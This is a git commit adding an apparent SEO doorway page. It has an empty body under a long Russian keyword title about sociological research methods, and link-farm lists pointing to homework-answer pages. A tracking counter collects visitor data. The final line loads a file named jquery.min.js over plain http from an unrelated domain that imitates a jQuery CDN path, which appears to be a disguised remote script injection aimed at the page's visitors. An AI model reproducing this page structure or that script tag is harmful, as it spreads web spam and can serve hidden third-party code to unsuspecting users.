47da5039370036880ca2b7056db686c6bb0da704
nolanmerle <nolanmerle@tcua9bnaq30uk.ga>
2019-02-12 00:39:48 +0000

    Initial commit

---
+++ s7ybjx-obekt-i-predmet-sociologicheskogo-issledovaniya-napisat-referat-po-predmetu-metodika-i-tehnika-sociologicheskih-issledovaniy-metodologiya-i-metodika-sociologicheskih-issledovaniy-sovremennye-metody-sociologicheskih-issledovaniy.h
@@ -0,0 +1,140 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Объект и предмет социологического исследования.написать реферат по предмету"методика и техника социологических исследований.методология и методика социологических исследований.современные методы социологических исследований" - yoofae.felixtripier.com</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">yoofae.felixtripier.com</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Объект и предмет социологического исследования.написать реферат по предмету"методика и техника социологических исследований.методология и методика социологических исследований.современные методы социологических исследований"</h2>
+                            </header>
+                            <p></p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="s7ybjx-gdz-potapov-matematika-6-klass-gdz-tetrad.html">Гдз потапов математика 6 класс гдз тетрадь</a></li>
+                                <li><a href="s7ybjx-546-837-gdz-po-algebre-9-klass-alimov.html">546-837 гдз по алгебре 9 класс алимов</a></li>
+                                <li><a href="s7ybjx-gdz-po-himii-9-klass-g-e-rudzitis.html">Гдз по химии 9 класс г.е. рудзитис</a></li>
+                                <li><a href="s7ybjx-gdz-po-angliyskomu-yazyku-7-klass-kaufman-v-rabochey-tetradi-2-chast.html">Гдз по английскому языку 7 класс кауфман в рабочей тетради 2 часть</a></li>
+                                <li><a href="s7ybjx-chitat-uchebnik-ang-yazyka-7kl-onlayn-avtor-biboletova.html">Читать учебник анг.языка 7кл.онлайн автор биболетова</a></li>
+                                <li><a href="s7ybjx-otvety-k-zadachniku-rabinovicha.html">Ответы к задачнику рабиновича</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="s7ybjx-reshebnik-po-moldavskomu-4-klass.html">Решебник по молдавскому 4 класс</a></li>
+                                            <li><a href="s7ybjx-gdz-po-russkomu-yazyku-5-klass-rabochaya-tetrad-lvova-1-chast-2014.html">Гдз по русскому языку 5 класс рабочая тетрадь львова 1 часть 2014</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="s7ybjx-uchebniki-po-matematiki-v-1995.html">Учебники по математики в 1995</a></li>
+                                            <li><a href="s7ybjx-uchebnik-po-informatike-bosova-7-klass-skachat.html">Учебник по информатике босова 7 класс скачать</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="s7ybjx-gdz-po-okruzhayuschemu-miru-3-klass-rabochaya-tetrad-fedotova-chast-1.html">Гдз по окружающему миру 3 класс рабочая тетрадь федотова часть 1</a></li>
+                                            <li><a href="s7ybjx-gdz-dlya-samostoyatelnyh-rabot-po-algebre-10-klass-aleksandrova.html">Гдз для самостоятельных работ по алгебре 10 класс александрова</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="s7ybjx-gdz-po-matematike-rabochaya-tetrad-nomer-2-kremneva.html">Гдз по математике рабочая тетрадь номер 2 кремнева</a></li>
+                                            <li><a href="s7ybjx-reshebnik-po-moldavskomu-4-klass.html">Решебник по молдавскому 4 класс</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://ilcf.info/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
